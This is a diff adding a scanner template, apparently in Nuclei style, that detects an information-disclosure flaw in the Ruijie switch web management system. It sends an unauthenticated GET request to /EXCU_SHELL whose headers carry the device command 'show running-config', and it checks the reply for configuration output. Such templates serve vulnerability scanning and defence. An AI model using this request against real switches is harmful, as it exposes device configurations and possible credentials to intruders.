@@ -1,0 +1,30 @@
+id: ruijie-excu-shell
+brief:
+    title: Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure
+    by: momika233
+    level: high
+    about: Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially exposing sensitive system information to unauthorized parties.
+    label:
+        - ruijie
+        - switch
+        - disclosure
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/EXCU_SHELL'
+      head:
+        Cmdnum: '''1'''
+        Command1: show running-config
+        Confirm1: "n"
+      signs:
+        - "on": word
+          has:
+            - Building configuration
+            - Current configuration
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
